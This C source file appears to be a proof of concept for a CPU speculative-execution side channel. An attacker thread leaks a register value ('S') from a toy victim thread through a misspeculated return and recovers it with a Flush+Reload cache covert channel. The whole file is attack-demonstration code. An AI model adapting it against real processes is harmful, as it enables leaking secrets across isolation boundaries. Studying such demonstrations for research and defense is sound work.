#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>

#include "libcache/cacheutils.h"

// Sleep for an predetermined amount of time specified in register r14
void __attribute__((noinline)) in_place() {
  size_t time = 0;
	asm volatile("movq %%r14, %0\n\t" : "=r"(time));
  
  usleep(time);
  return;
}

void* __attribute__((noinline)) attacker() {
  // Attacker is going to sleep for 65
  asm volatile("movq $65, %r14\t\n"); // 65 is 'A'
  
  while(1) {
    // Put to sleep
    // As victim will sometimes wake up before the attacker, it will return here
    in_place();
    size_t secret = 0;
    // Retrieve secret data from register r14
    asm volatile("movq %%r14, %0\n\t": "=r"(secret));
    
    // Encode data in covert channel
    cache_encode(secret);
  }
}

void* __attribute__((noinline)) victim() {
  // Victim is going to sleep for 83
	asm volatile("movq $83, %r14\t\n"); // 83 is 'S'
  while(1) {
    // Call function and return here after misspeculation is detected
    in_place();
  }
}

int main(int argc, char **argv) {
  pagesize = sysconf(_SC_PAGESIZE);
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  char *_mem = malloc(pagesize * (256 + 4));
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  memset(mem, 0, pagesize * 256);

  // Create two interleaving threads
  pthread_t attacker_thread;
  pthread_t victim_thread;
  pthread_create(&attacker_thread, 0, attacker, 0);
  pthread_create(&victim_thread, 0, victim, 0);

  while(1) {
    // Flush our shared memory
    flush_shared_memory();

    mfence();
    nospec();

    // Recover data from covert channel
    for (int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
      if (flush_reload(mem + mix_i * pagesize)) {
        if (mix_i > 'A' && mix_i <= 'Z') {
          printf("%c   ", mix_i);
          break;
        }
        fflush(stdout);
        sched_yield();
      }
    }
  }
}
